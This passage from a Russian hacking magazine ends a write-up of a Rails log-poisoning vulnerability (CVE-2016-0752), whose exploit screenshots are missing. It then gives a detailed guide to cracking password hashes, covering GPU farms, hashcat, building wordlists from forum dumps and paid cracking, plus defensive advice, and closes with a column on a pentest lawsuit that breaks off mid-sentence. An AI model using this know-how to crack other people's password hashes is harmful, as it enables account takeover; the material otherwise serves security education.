рую мы уже не раз описывали. Ruby on Rails спроектирован так, что записыва-
ет все запросы, включая параметры, в файл с логами окружения (к примеру,
development.log).
  Отправим запрос на правильную страницу, но с поддельным параметром
и URL-кодированным значением.




Проверим содержимое лога.

                                                           Полученное со-
                                                        держимое файла
                                                                    development.log



И попытаемся обратиться к обновленному development.log.





Результат выполнения команды ls
Наша небольшая полезная нагрузка была выполнена и заменена на результат
работы команды ls.
   Автором был написан модуль для Metasploit, который автоматизирует атаку.

                                                       Пример успешной
                                                             эксплуатации уязви-
                                                            мости CVE-2016-0752





Оригинальную статью ты можешь прочитать в блоге компании автора. В ней
же он приводит и пример патча к фреймворку, если ты по тем или иным причи-
нам не можешь обновить RoR.

TARGETS
Ruby on Rails без патча от 25 января 2016 года.

SOLUTION
Производитель выпустил исправление.
ВЗЛОМ
СОВРЕМЕННЫЙ
ХЕШКРЕКИНГ
ВЗГЛЯД НА ВЗЛОМ ХЕШЕЙ ИЗНУТРИ





                                                                                             InsidePro Software
                                                                                                 www.insidepro.com
Часто хакер проделывает огромную работу
для проникновения в систему, и от получения к ней
полного доступа его отделяет всего один шаг —
подбор пароля к хешу (зашифрованному паролю
администратора или нужного пользователя). На сло-
вах звучит просто, а как на деле? И что нужно знать
и уметь, чтобы успешно восстанавливать даже самые
стойкие пароли? А может, лучше сразу обратиться
к тем, кто профессионально занимается хешкрекин-
гом многие годы?

ЧТО ТАКОЕ ХЕШКРЕКИНГ?
Восстановление паролей к хешам, или хешкрекинг (от англ. hash cracking), —
весьма увлекательный процесс, для которого требуются хорошие знания в раз-
личных областях — криптографии, комбинаторике, программировании и мно-
гом другом. Нужно также отлично разбираться в железе, чтобы обеспечить
бесперебойную работу своей фермы в течение многих недель и месяцев при
максимальной загрузке.
  При этом настоящий хешкрекер часто полностью изолирован от этапов из-
влечения хешей и применения сломанных паролей для доступа к чужим аккаун-
там. Более того — ему это неинтересно, он же не хакер. На всех хешкрекерских
форумах публикуются только хеши (или списки хешей) для расшифровки. Эти
списки не содержат ни имени ресурса, ни имен пользователей, ни почтовых
ящиков, ни IP-адресов, никакой другой приватной информации. Поэтому, даже
сломав пароль, хешкрекер никогда его не применит, так как просто не знает —
откуда он. А если б и знал — все равно не применит, так как его цель — сам
процесс хешкрекинга, ведь для него это почти искусство.
   Большинство хешкрекеров на форумах — этакие робин гуды. Они тратят
свое время и ресурсы на то, чтобы помочь сломать хеши другим пользова-
телям, и при этом непрерывно накапливают себе новые пароли и правила их
формирования. Для них любые хеши — это вызов их интеллекту, их опыту, их
мастерству. И эти парни находят сложнейшие пароли, которые никто другой
восстановить не может. Как у них это получается? Каким софтом и железом они
пользуются? Что еще нужно знать, чтобы ломать хеши так же эффективно, как
они? Об этом мы и расскажем в нашей статье.
                                                                  Рис. 1. Хеши и паро-
                                                          ли пользователей





СОФТ
Сейчас хешкрекинг в основном производится на видеопроцессорах (GPU). На
обычных процессорах (CPU) брутятся только те алгоритмы, которые не реа-
лизованы под GPU. Для брута на GPU фактически уже стандартом стало ис-
пользование программы oclHashcat, имеющей сборки как для Windows, так
и для Linux, а также поддерживающей все современные видеопроцессоры —
и NVIDIA, и AMD. Совсем недавно ее автор перевел программу в разряд Open
Source, и теперь она доступна на GitHub, так что каждый желающий может при-
соединиться к работе над ее новыми версиями. Для распределения работы
этой программы между несколькими компьютерами используется оболочка
hashtopus. Другим популярным GPU-брутфорсером остается нестареющий
John the Ripper (JtR) в сборке Jumbo, который также имеет множество алго-
ритмов под все видеокарты, но для получения максимальной эффективности
его желательно все-таки пересобирать под каждую конкретную конфигурацию
железа.
   Для работы на CPU программ гораздо больше, но самыми функциональ-
ными остаются все те же hashcat и JtR. Еще можно к ним добавить программу
Hash Manager, которая больше заточена под обработку хешей в «промышлен-
ных масштабах», то есть очень крупных списков, которые не удается загрузить
в другие программы. Все эти программы бесплатные, и каждый решает сам,
что выбрать себе для ежедневной работы, только практика показывает, что же-
лательно уметь владеть всем этим софтом — как правило, профессиональные
хешкрекеры используют ту или иную программу в зависимости от конкретной
ситуации.
  Еще нужно учесть, что все эти программы консольные, не имеют встроенно-
го GUI и, чтобы использовать их максимально эффективно, нужно уметь рабо-
тать в консоли (см. врезку). А в идеале еще нужно уметь программировать ко-
мандные файлы (BAT или CMD), чтобы максимально гибко настраивать работу
программ. Тогда можно однократно составить для себя комплект командных
файлов для разных атак, а потом, когда все настроено, весь хешкрекинг све-
дется к заполнению файла нужными хешами и запуску того или иного команд-
ного файла с определенными параметрами.

ЖЕЛЕЗО
Хешкрекеры в плане железа почти ничем не отличаются от майнеров криптова-
лют и собирают себе такие же фермы на видеокартах. Правда, в них не десятки
видеокарт, но наличие нескольких мощных видеокарт — это уже почти норма
для брута хешей (см. рис. 2).

                                                                  Рис. 2. Хорошая на-
                                                              стольная ферма для
                                                                брута хешей на пяти
                                                             видеокартах





Требования к ферме такие же, как и при майнинге криптовалют, то есть нужно
хорошее охлаждение, стабильное электропитание и грамотное размещение ви-
деокарт, чтобы они не нагревали друг друга. До недавнего времени основными
видеокартами для брута служили (как и в майнинге) видеокарты на процессорах
AMD, так как они были более эффективны по соотношению цена/скорость. Од-
нако после релиза архитектуры sm_50 (Maxwell) от NVIDIA выяснилось, что она
лучше для брута, при этом видеокарты с такой архитектурой потребляют гораз-
до меньше электроэнергии, а также более тихие и холодные. И сейчас эффек-
тивнее всего для брута хешей карты NVIDIA GTX 980Ti (см. рис. 3).
  И недаром же на форуме InsidePro все больше и больше хешкрекеров пере-
ходят на эти видеокарты (судя по подписям в их сообщениях) — при пиковом
потреблении всего 165 Вт на алгоритме MD5 они выдают скорость порядка 15
миллиардов паролей в секунду. Но у них один недостаток — высокая цена, ко-
торая практически не снижается, а в связи со скачком курса доллара она под-
нялась еще больше. Если же основной критерий — цена, а все остальные па-
раметры не важны, то можно взять видеокарты на процессорах AMD и упаковать
ими свою ферму. К примеру, обычная цена системы c двумя средними видео-
картами составляет около 1200–1300 долларов.

                                                                  Рис. 3. GTX 980Ti —
                                                           отличный выбор для
                                                           хешкрекинга





Что касается CPU, то тут все просто — чем больше ядер, выше частота и больше
объем кеша, тем быстрее будет идти перебор. Мощный процессор позволит как
использовать ферму для перебора паролей на GPU, так и параллельно с ними
нагружать CPU второстепенной работой — например, проверкой других хешей
по словарям, пока все GPU заняты гибридной или комбинированной атакой. Под-
держка новейших наборов команд (SSE и AVX последних версий) также необхо-
дима, так как почти все вышеперечисленные программы имеют код, заточенный
под эти наборы команд, что существенно увеличивает скорость перебора.
  А есть хоть что-то, в чем CPU еще может конкурировать с GPU по скорости
брута? При небольших объемах — нет, конечно. Но вот на больших списках
хешей в десятки миллионов хешей (особенно соленых) очень часто обработка
списка на CPU дает такую же скорость или даже большую, чем на видеокарте.
А уж сотни миллионов хешей в GPU часто просто не загрузить физически —
остается только разбивать список на более мелкие фрагменты и брутить их по
очереди, но это пропорционально увеличивает время атаки, в то время как на
CPU можно загрузить и обработать весь список за один заход, если позволяет
объем RAM.
  И есть еще одна тема, где со временем CPU может обогнать GPU, — это
сопроцессор Intel Xeon Phi. Да, его цена пока очень высока, но, возможно, со
временем она станет приемлемой, и его можно будет прикупить и задейство-
вать для брута хешей на домашнем компьютере. Вот тогда может получиться
очень мощная система, так как в нем присутствует около 60 четырехъядерных
процессоров (в зависимости от модели), а это даст нам до 240 потоков для пе-
ребора. На тяжелых алгоритмах типа bcrypt (которые очень медленны даже на
видеокартах) этот сопроцессор может быть в разы быстрее даже самых топо-
вых видеокарт, так что не зря ребята из команды john-users прозвали его «убий-
цей bcrypt». Правда, хешкрекерского софта под него в паблике пока нет, но со
временем он обязательно появится.
   Конечно, читатель может возразить — а как же микросхемы FPGA (ПЛИС),
выдающие при майнинге того же биткойна огромные скорости? Да, они выдают
даже терахеши в секунду, только они запрограммированы под единственный
алгоритм SHA-256, который при хешировании обычных паролей пользователей
применяется весьма редко (а другой популярный алгоритм майнера — SCRYPT —
не применяется вообще). Плюс сама по себе микросхема ПЛИС выдает невысо-
кую скорость, а терахеши получаются путем объединения десятков (а то и сотен
микросхем) в матрицы, а это уже недешевое решение. Но главный недостаток
всех ПЛИС — они программируются только на брут одиночного хеша. Конечно,
на эти микросхемы уже портировано множество алгоритмов, включая MD5, но
практической пользы от этого мало — выгодней купить видеокарту. Хотя и Altera,
и Xilinx развивают свои линейки ПЛИС весьма активно, и со временем эта тема
тоже может стать очень интересной для хешкрекера.

СЛОВАРИ
Успех в хешкрекинге основан на хороших словарях, желательно состоящих из
реальных паролей пользователей. Где же их взять? Есть три пути, рассмотрим
их подробнее.
1. Скачать из интернета готовые словари (погуглив слово wordlist). Это самый
   простой способ, но и словари эти весьма низкого качества — в них много
   мусора и искусственно нагенерированных слов, а мало реальных паролей.
   Так что этот вариант — если только на первое время.
2. Скачать вложения (аттачменты) к сообщениям о сломанных хешах на фору-
   мах InsidePro и HashKiller — там часто размещаются просьбы о помощи при
   бруте крупных списков, и другие форумчане помогают, выкладывая свои ре-
   зультаты в формате хеш:пароль. А значит, можно накачать себе таких фай-
   лов и извлечь оттуда все пароли. Это уже будут очень хорошие словари, но
   у них будет один недостаток — все пароли из таких словарей лежат в пабли-
   ке и доступны также и всем остальным хешкрекерам.
3. Нарабатывать словари самому, постоянно обрабатывая списки невзломан-
   ных хешей, которые можно накачать с тех же форумов. Это самый действен-
   ный метод, хотя и самый долгий. Однако такие словари — наиболее ценные,
   так как содержат только реальные, уникальные и часто приватные пароли.
   У профессиональных хешкрекеров есть даже такой термин, как «майнинг
   реалпассов», то есть если есть платные хеши — ферма брутит их, если их
   нет — ферма не простаивает, а сутками брутит списки несломанных хешей
   с форумов, непрерывно нарабатывая все новые и новые уникальные пароли
   в копилку хешкрекера.

Очевидно, что тот, кто серьезно занимается хешкрекингом, идет по последне-
му пути и постепенно накапливает свой собственный и очень эффективный
словарь.

КАК СЛОМАТЬ ХЕШ, ЕСЛИ ПОД РУКАМИ НЕТ
НИ ЖЕЛЕЗА, НИ СОФТА?
Для этого можно проверить свой хеш в онлайн-базах хешей типа cmd5.ru. Или
сразу на сервисах типа hashchecker.de, которые проверяют хеш массово в де-
сятках баз, и, может быть, тебе повезет.
  Но у таких сервисов есть недостаток — в основном они содержат хеши от ис-
кусственно сгенерированных паролей. Пока единственный сервис, где собра-
ны только реальные хеши и пароли пользователей, — Hash Finder. На нем уже
накоплено более 500 миллионов таких хешей и паролей — все они были кем-то
когда-то реально использованы, поэтому процент найденных паролей на нем
гораздо выше, чем на других сервисах.
  Еще вариант — разместить свой хеш (или список хешей) на одном из хеш-
крекерских форумов, где всегда можно получить помощь. Самые популярные
форумы:
•  forum.insidepro.com;
•  forum.hashkiller.co.uk;
•  forum.antichat.ru/forums/76.

Также можно разместить свой хеш и в платных ветках этих форумов, указав цену
за найденный пароль. Тогда с ним гарантированно начнут работать десятки
хешкрекеров, и высока вероятность, что пароль будет найден.
ДОПОЛНИТЕЛЬНЫЕ ИНСТРУМЕНТЫ
Программы для брута хешей — это лишь малая часть софта из арсенала хеш-
крекера. Вернее, это его самая простая часть — взял файл с хешами, настроил
нужные атаки и запустил. Всё — программа может крутиться сутками. Только
поглядывай, сколько процентов хешей сломано.
  Обычно через хешкрекера проходит множество всевозможных текстовых
файлов:
•  списки хешей в разных видах и форматах, часто с перемешанными хешами
   разных типов, и нужно извлечь хеши отдельно по каждому алгоритму;
•  словари, которые надо чистить, сортировать, удалять повторы;
•  накопленные результаты брута, в которых часто перемешаны и несоленые
  хеши с паролями, и соленые хеши с паролями,
   и так далее.

В общем, сотни и тысячи подобных разнородных файлов — это еще та голов-
ная боль. И все выкручиваются по-разному — кто-то в том же линуксе делает
часть работы командами самой ОС (например, grep), кто-то пишет себе скрип-
ты на Perl, кто-то использует различные программы. Но факт очевиден — по-
мимо брутфорсеров, нужны еще инструменты, которые должны работать с тек-
стовыми файлами: сортировать, чистить, конвертировать из одного формата
в другой, извлекать или переставлять данные, проверять формат и так далее.
   Без этих инструментов работать крайне сложно, и поэтому с каждым брут-
форсером обычно поставляется свой комплект различных утилит. И hashcat име-
ет такой комплект, и JtR тоже, но самый крупный комплект утилит под Windows
имеет программа Hash Manager. В ней более 70 инструментов, построенных по
принципу одна функция = один файл. Таким образом, из них, как из кирпичиков,
можно собрать BAT-файл, выполняющий обработку файлов любой сложности.
А 64-битные версии инструментов позволяют обрабатывать файлы неограни-
ченного размера.
   Вот пример BAT-файла, демонстрирующий, как из списка, в котором пере-
мешаны хеши разных типов, вытащить только хеши от Magento с двухсимволь-
ной солью:

REM Извлекаем только строки длиной 35 символов
ExtractLinesByLen.exe %1 35 35
REM Переименовываем файл с извлеченными строками в файл 2.txt
MOVE /Y %1.Lines 2.txt
REM Проверяем формат хешей
IsCharset.exe 2.txt ?h 1
REM Проверяем формат соли
IsCharsetInPos.exe 2.txt 33 ‘:’
IsCharsetInPos.exe 2.txt 34 ?l?u?d
IsCharsetInPos.exe 2.txt 35 ?l?u?d
REM Готово! В файле 2.txt остались только хеши от Magento

В дистрибутиве программы Hash Manager, в папке Bonus, можно найти около 30
готовых примеров, выполняющих различные полезные функции для хешкрекера.

АЛГОРИТМЫ ХЕШИРОВАНИЯ
С одной стороны, набор актуальных алгоритмов хеширования почти не меня-
ется со временем. Причины просты — алгоритмы хеширования паролей поль-
зователей ОС не меняются годами, да и в интернете сотни тысяч ресурсов все
еще базируются на устаревших движках, и обновление версий не происходит,
несмотря на то что все новые версии форумов и CMS уже поддерживают более
надежное хеширование — например, в IPB версии 4 уже сразу стоит алгоритм
bcrypt. С другой стороны, небольшие изменения все-таки происходят — все
больше начинает попадаться очень тяжелых алгоритмов — различные вари-
анты PBKDF2 и тот же bcrypt, которые брутятся с мизерной скоростью даже на
фермах.
   Всего же известны уже сотни алгоритмов, примеры их хешей можно посмо-
треть здесь. Подавляющее большинство алгоритмов хеширования базируется
на каком-либо из стандартных алгоритмов — MD5, SHA-1, SHA-256 и SHA-512
или на их комбинациях. Брутфорсеры давно уже поддерживают десятки таких
алгоритмов в GPU-версиях и сотни алгоритмов в CPU-версиях.
   Работа с любым хешем начинается с анализа его формата. Если он име-
ет какую-то знакомую сигнатуру (см. примеры хешей выше), то сразу понятно,
каким алгоритмом его брутить. Если же хеш без сигнатуры, то анализируется
движок того форума или CMS, откуда он взят. Большой список движков с опи-
санием алгоритма в каждом из них имеется здесь. Если же движок известен,
а алгоритм хеширования так и не понятен, то можно попробовать поискать в ин-
тернете дистрибутив этого движка и проанализировать его исходники, в части
кода авторизации пользователей.
   Если же исходников движка нет, тогда нужно заполучить хеш от какого-то за-
ранее известного пароля — например, зарегистрировать пару новых пользо-
вателей на форуме, желательно с одинаковым простым паролем вида 123456.
Если их хеши будут одинаковы (считаем, что доступ к хешам у хакера есть), зна-
чит, при хешировании используется только пароль. Если разные, то к паролю
подмешивается еще что-то, уникальное для каждого пользователя, — соль,
логин, email. А дальше можно попробовать подобрать алгоритм по имеюще-
муся паролю и хешу. Например, в программе Hash Manager, в папке Bonus\
SearchAlgorithm есть BAT-файл для автоматического поиска алгоритма по всем
доступным в программе алгоритмам (около 400), включая проверку паролей
в кодировке Unicode, а также соли (или имени пользователя) в шестнадцате-
ричном виде.
   Ну а если так и не удается определить алгоритм, то можно спросить на фо-
руме — например, здесь. Вдруг кто-то уже сталкивался с такими хешами?

МОЖНО ЛИ ЗАРАБОТАТЬ НА ХЕШКРЕКИНГЕ?
Да, конечно. Как правило, заработать можно в любом деле, главное — быть
в этом деле профессионалом. И хешкрекинг — не исключение. На всех хеш-
крекерских форумах есть платные разделы, где размещаются заказы на взлом
хешей. Имея хорошие словари, можно попробовать свои силы во взломе таких
хешей. Только надо учитывать, что основное правило на таких форумах — кто
первый сломал хеш, тот и получает плату за него. Поэтому мощное железо про-
сто необходимо, чтобы успеть сломать хеш быстрее других хешкрекеров. Как
правило, взлом таких хешей и составляет основной доход хешкрекера.
   Есть еще вариант заработка, набирающий популярность в последнее время,
но он уже для владельцев крупных ферм. Можно такие фермы сдавать в аренду
хешкрекерам с посуточной оплатой: часто бывает так, что нужно быстро про-
брутить особо ценный хеш на хорошую глубину, а мощности одной или даже
нескольких видеокарт явно недостаточно. Или же крупные мощности могут по-
требоваться на время проведения конкурсов по хешкрекингу.


ПО ДРУГУЮ СТОРОНУ БАРРИКАДЫ
Теперь посмотрим на хеши глазами администратора того ресурса, который он
хочет максимально защитить от взлома. Как можно усложнить жизнь хешкреке-
ру или вообще сделать так, что хеши пользователей станут неломаемыми?
   Иногда для этого достаточно перейти на самую свежую версию движка
и выбрать алгоритм, самый медленный по скорости брута. Но если обновле-
ние движка не планируется, а администратор хочет максимально обезопасить
пароли своих пользователей от подбора, то есть другой вариант — пропатчить
код проверки пароля так, чтобы у всех вновь зарегистрированных пользовате-
лей (или сменивших свои пароли после определенной даты) пароли хеширова-
лись по-другому. Как?
   Конечно, можно использовать любой стандартный тяжелый алгоритм из
Linux-функции crypt() — sha512crypt или bcrypt. Но если удастся заполучить
такие хеши, то хешкрекер по сигнатурам сразу определит алгоритм и сможет
ломать хеши (хоть и медленно). Вывод — нужно хешировать пароли так, чтобы
хешкрекер не мог однозначно определить алгоритм по виду хеша, а это дела-
ется только нестандартными методами.
   Например, можно подмешивать к паролю статическую соль (пусть даже оди-
наковую для всех, но очень длинную — 200–500 символов) и хешировать обыч-
ной PHP-функцией md5. Этой соли в БД форума нет (как, например, в движках
vBulletin или osCommerce), она прошита только в PHP-коде, доступ к которому
получить гораздо сложнее, чем к хешам. Но даже если заполучить эту соль, то
почти нет брутфорсеров, поддерживающих работу с такой длинной солью (во
всяком случае, на GPU — точно нет).
   Другой вариант — циклически хешировать обычный MD5 от пароля этак 50–
100 тысяч раз. На скорости авторизации пользователей это почти не скажется,
но скорость брута таких хешей будет мизерной (при условии, что еще удаст-
ся выяснить количество итераций — опять же, только из PHP-кода). А если не
удастся — то их вообще не сбрутить.
  Еще можно взять более длинный хеш от другого алгоритма (например, SHA-
256 или SHA-512) и вместо цельного хеша хранить в БД его фрагмент разме-
ром 32 символа из середины хеша (да еще и байты можно переставить). Хеш-
крекер, увидев такой хеш, будет уверен, что это MD5 (или его модификация),
и будет пытаться сбрутить его, но бесполезно.
  В общем, тут фантазия безгранична — автор за годы работы с хешами стал-
кивался с массой различных хитроумных видов хеширования, но факт нали-
цо — очень много дампов от самописных CMS, или от коммерческих CMS без
доступных исходников, или от пропатченных (по-видимому) форумов, и CMS
остаются до сих пор несломанными. Что там внутри намешано при хеширова-
нии — неизвестно.
  И нестареющий совет всем пользователям: самый надежный вариант за-
щитить свой аккаунт от взлома, даже если был получен доступ к хешу от вашего
пароля, — использовать длинный пароль, состоящий из случайных символов.
Такие пароли не ломаются!

ЧАСТОТНЫЕ СЛОВАРИ
Допустим, имеется огромный список соленых хешей, который надо быстро об-
работать. Как это сделать, если атака по большому словарю даже на мощной
ферме будет идти много суток, а то и недель? Ответ один — использовать ча-
стотные словари.
   Что это такое? Это обычные словари, но в них пароли отсортированы в по-
рядке убывания частоты их употребления. В таких словарях первыми идут наи-
более популярные пароли — см. примеры таких словарей в дистрибутиве
программы Hash Manager, файлы Top100xx.dic. Очевидно, что эффективней
проверить хеши сначала на самые часто употребляемые пароли, затем — на
более редкие и так далее. Это позволит быстро сломать все популярные паро-
ли и существенно облегчить список хешей для последующей работы.
   Таким образом, накопив порядочно словарей, можно собрать по ним стати-
стику, сформировать собственный частотный словарь и обработку всех тяже-
лых списков хешей начинать именно с него.


КОНСОЛЬ — РАЙСКИЙ ДОМ ХЕШКРЕКЕРА
Самый продвинутый хешкрекерский софт — консольный и управляется либо че-
рез параметры командной строки, либо через редактирование файлов конфи-
гурации. Но тенденция такова, что пользователи все дальше и дальше уходят от
консоли, требуют графического интерфейса и наиболее популярный вопрос с
форумов по работе с такими программами звучит так: «Я запустил программу,
выскочило черное окно и закрылось. Что делать?» Ответ очевиден — изучать
консоль.
   Скорее всего, линуксоиды и так владеют навыками работы в консоли, а вот
для пользователей Windows лучшим выбором будет программа FAR Manager.
С ее помощью очень удобно работать со списками хешей и другими файлами.
А если ее объединить с дополнительными инструментами (например, из соста-
ва программы Hash Manager), то получится просто убойный комплект, позволя-
ющий обрабатывать любые файлы буквально за секунды.
   Для этого нужно через пользовательское меню (по нажатию F2) на нужные
клавиши назначить самые часто используемые инструменты — отсортиро-
вать файл, извлечь пароли из файла результатов, подсчитать количество строк
в файле и так далее. После этого вся работа с нужным файлом сведется к трем
действиям — встать на него курсором, вызвать F2 и нажать горячую клавишу.
   После того как полностью настроишь FAR под себя — цветовой раскраской
файлов, быстрыми клавишами для инструментов, быстрыми переходами в нуж-
ный каталог и так далее — вся рутинная работа хешкрекера станет очень ком-
фортной, а значит — и очень эффективной.
КОНКУРСЫ ПО ХЕШКРЕКИНГУ
А где хешкрекер может посоревноваться с другими хешкрекерами в своем уме-
нии ломать хеши? Конечно же, на конкурсах! Основные — конкурс Crack Me If
You Can, проводимый фирмой KoreLogic в рамках ежегодной конференции DEF
CON, и конкурс Hash Runner на ежегодной конференции Positive Hack Days.
   Правила этих конкурсов весьма просты — нужно за ограниченное время
(как правило, за 48 часов) сломать как можно больше конкурсных хешей и вы-
полнить дополнительных заданий, также связанных с хешами. И так как время
сильно ограничено, то на время таких конкурсов хешкрекеры всегда объеди-
няются в команды. Исторически сложилось так, что с самых первых конкурсов
сформировались три основные команды — InsidePro, hashcat и john-users, ко-
торые все эти годы стабильно делили меж собой три призовых места в различ-
ных комбинациях. Даже по названиям команд уже очевидно, вокруг какого со-
фта или сайта они объединились. В составе каждой из команд есть автор этого
софта, и причина этого тоже понятна — на конкурсах всегда встречаются новые
или видоизмененные алгоритмы хеширования, и нужно очень быстро модифи-
цировать программу-брутфорсер или добавить в нее новый алгоритм. Тому,
кто не имеет возможности быстро (часто за несколько часов или даже минут)
перекроить софт под нужные фишки, очень сложно претендовать на приз.
  Все отчеты о конкурсах доступны на сайтах команд, а также на сайтах орга-
низаторов — например, тут.

                                                                  Рис. 4. Архивное
                                                           фото — организа-
                                                           торы конкурса по
                                                            хешкрекингу на DEF
                                                   CON 2012





К сожалению, других крупных конкурсов по хешкрекингу нет. Иногда бывают не-
большие конкурсы на хешкрекерских форумах, но их размах гораздо меньше.
А с другой стороны, многие профессиональные хешкрекеры всегда находят-
ся в «режиме конкурса», так как на форумах периодически размещаются хеши
стоимостью в сотни и даже тысячи долларов, поэтому сразу после их опубли-
кования хешкрекеры включаются в борьбу за этот хеш, чтобы обойти других,
первому сломать пароль и получить «приз», то есть плату за пароль.

ЗАКЛЮЧЕНИЕ
Усложнение алгоритмов хеширования и применение пользователями все бо-
лее сложных и длинных паролей компенсируется увеличением вычислительной
мощности хешкрекера и созданием все более мощных ферм, которые ломают
хеши на таких скоростях, которые мы даже не могли себе представить еще не-
сколько лет назад.
  Но главное в том, что сама идеология — хранение паролей пользователей
в виде хешей — многие годы уже не меняется, и это относится как к паролям
пользователей интернет-ресурсов, так и к пользователям всевозможных опе-
рационных систем, а значит, знания в области хешкрекинга будут актуальны
и на все ближайшие годы!
 ВЗЛОМ: Колонка Юрия Гольцева
  THERE IS NO
100% GUARANTEE





                   Юрий Гольцев
                                                        @ygoltsev


 Тестирование на проникновение (penetration testing) —
 метод оценки безопасности компьютерных систем
 или сетей средствами моделирования атаки злоу-
 мышленника. Для кого-то это хобби, для кого-то рабо-
 та, для кого-то это стиль жизни. На страницах нашего
 журнала мы постараемся познакомить тебя с профес-
 сией настоящего хакера на службе корпорации, с за-
 дачами, которые перед ним ставятся, и их решениями.
INTRO
Когда кто-нибудь пытается убедить меня в том, что он, компания или продукт
способны выявить абсолютно все уязвимости в тестируемой системе, я могу
лишь предположить, что передо мной либо кто-то из отдела продаж, либо не-
компетентный технический специалист. С увеличением скоупа количество век-
торов атак растет в геометрической прогрессии (FUD! Deal with it!).
  В идеальном мире это должен понимать как исполнитель, так и заказчик. Как
ты знаешь, мы в таком мире не живем. Каждый уважающий себя и своего заказ-
чика консалтер перед заключением договора тщательно обговаривает нюансы
и возможные спорные моменты. Заказчик должен знать, почему подобные ра-
боты не дают стопроцентного раскрытия всех уязвимостей ИС. Это аксиома.
Количество найденных уязвимостей напрямую зависит от их наличия и от ком-
петенции исполнителя. В общем случае консалтер обязуется применить пред-
ложенную методологию поиска определенных типов уязвимостей в отношении
обозначенного перечня ресурсов. То, что в результате работ по оценке анали-
за защищенности рождаются новые техники эксплуатации и векторы атак, —
явление побочное и абсолютно не обязательное.

ПРЕЦЕДЕНТ
В январе 2016 года произошел интересный и первый в своем роде прецедент:
на компанию, которая занимается консалтингом в сфере ИБ, был подан иск
в суд. Причина — заказчик, изучив отчет о проделанной работе, заподозрил
исполнителя в отсутствии технических компетенций.
   История началась в октябре 2013 года. Некая организация Affinity Gaming,
которая занималась игорным бизнесом, обнаружила утечку данных кредитных
карт своих клиентов. В рамках реагирования владельцы казино заключили кон-
тракт с фирмой Trustwave, которая обязалась провести расследование инци-
дента и, вероятно, дать рекомендации по устранению уязвимостей.
  По словам представителей Trustwave, заказчик был уведомлен о том, что
«качество услуг, предоставляемых в рамках их соглашения, полностью сопоста-
вимо с качеством аналогичных услуг, оказываемых другими компаниями, явля-
ющимися признанными профессионалами в области ИБ». По окончании работ
сотрудники Trustwave заверили заказчика в том, что источник утечки обезвре-
жен. Я предполагаю, что было проведено как минимум расследование инциден-
та (выявление вектора, хронологии действий атакующего). После чего на осно-
вании этих данных скомпрометированная ИС, скорее всего, была «вычищена»
(установлены заплатки, изменены пароли, удалены бэкдоры и так далее).
   Далее произошло вот что. Для соответствия очередному стандарту, ко-
торый форсировал игорный комитет штата Миссури (где располагается ка-
зино Affinity), необходимо было провести тестирование на проникновение.
В апреле 2014 года руководство Affinity Gaming обратилось за этой услугой
в небезызвестную компанию Ernst & Young. Аудиторы E&Y обнаружили в сети
подозрительную активность, источником которой, как выяснилось, была про-
грамма Framepkg.exe. Важный момент: этот самый бинарник был исследован
Trustwave, но его сомнительные функции не были упомянуты в отчете.
   Казалось бы, такое случается: между аудитами прошло некоторое время,
состояние ИС могло измениться. В параграфе PRELIMINARY STATEMENT иска
не сказано, каким образом было выявлено, что отчет Trustwave — полная туфта.
Этот момент поставил под вопрос все результаты работы Trustwave.
   Владелец казино обратился в IT-security компанию — Mandiant. Ребята из
этой конторы провели собственное расследование и в итоге пришли к выводу,
что отчет Trustwave был очень неточным, и складывалось впечатление, что ра-
боты были проведены неадекватно. По факту Trustwave солгал заказчику о том,
что источник утечки данных был диагностирован и устранен. В реальности ис-
полнитель изучил лишь малую долю ресурсов и так и не смог точно выявить, как
именно было осуществлено проникновение.
   Заказчик в результате посчитал, что договор грубо нарушен и Affinity понес-
ла колоссальные убытки, в связи с чем неплохо было бы, если бы исполнитель
вернул все потери. В Trustwave делать это отказались, и в результате в конце
2015 года компания Affinity Gaming подала иск в суд.
   Вероятно, если бы не иск, эта история не стала бы достоянием обществен-
ности. Неудивительно, что в Trustwave с иском не согласны: компания попыта-
ется отстоять в суде свою репутацию. К сожалению, какие-либо технические
детали этого события остаются пока за кадром, так что судить о том, что имен-
но произошло и кто прав, не представляется возможным.

PIECE FROM MY REALITY
В моей практике была относительно похожая история. Для одной крупной ком-
пании был проведен комплексный тест на проникновение. Как и в большин-
стве случаев, проникновение было осуществлено извне и был получен полный
контроль над всеми системами заказчика. Отчет был подготовлен и передан
представителям компании, проведена презентация результатов для руковод-
ства. Все довольны, договор закрыт.
  По завершении проекта я имею привычку забывать большинство техниче-
ских деталей проведенных работ, а через какое-то время и сами заказчики
забываются. Я считаю эту особенность даже полезной, голова не забивается
бесполезной информацией. В этот раз быстро забыть детали проекта не полу-
чилось.
   Спустя месяц после сдачи отчета, листая ленту твиттера, я наткнулся на твит,
содержащий информацию об уязвимости на одном из ресурсов моего заказ-
чика. Прилагались и логи ее эксплуатации. Из этого pwnage было понятно, что
уязвимость в ресурсе была очевидной. Если честно, в этот момент мне стало
немного не по себе — технические детали работ начали забываться, и я не был
уверен в том, что нашел эту уязвимость и рассмотрел в отчете.
   Признаться честно, в первую очередь я подумал о себе и о том, какой удар
подобное событие может нанести по ЧСВ и репутации. В течение трех меся-
цев после окончания работ у меня хранится зашифрованный архив проектных
данных — на случай если заказчику понадобится дополнительная консульта-
ция или бэкап результатов. В нем я нашел описание уязвимости, которая стала
достоянием общественности. С одной стороны, ЧСВ и репутация спасены, а
с другой стороны, взломанный ресурс оказался одной из точек проникновения
во внутреннюю сеть заказчика.
  Я начал серьезно переживать за отдел ИБ заказчика и эту компанию в це-
лом. Я решил уведомить отдел ИБ о том, что есть некоторая вероятность того,
что их система была скомпрометирована кем-то со стороны. Я ограничился
небольшим почтовым сообщением, где изложил мои подозрения, и ссылкой на
источник.
  Из любопытства и желания помочь безопасникам я принялся изучать логи
pwnage. В этот момент я осознал, что, скорее всего, мои волнения были на-
прасными. После анализа доказательств взлома, выложенных на публике, ста-
ло понятно, что весь инцидент — проделки скрипт-кидди с sqlmap в консоли.
   Ставка была сделана на то, что уязвимый ресурс доступен на одном из до-
менов серьезной трансконтинентальной корпорации. Соответственно, публи-
кация подобного pwnage будет сконвертирована людьми, далекими от ИТ и ИБ,
в популярность героя, который так и остался неизвестен. «Хакер», вероятно,
даже не понял, куда он попал и какие это перед ним открывает возможности
в плане развития атаки. Он решил ограничиться лишь бесполезным дампом
БД, даже не удосужившись немного изучить код приложения и добиться RCE.
  Я передал свои предположения и выводы представителю заказчика. По ре-
зультатам внутреннего расследования мои выводы подтвердились. Вес голоса
отдела ИБ значительно вырос, что позволило им провернуть мероприятия по
устранению найденных уязвимостей в кратчайшие сроки.
   Как видишь, эта история для всех завершилась хорошо. Я не уверен, что,
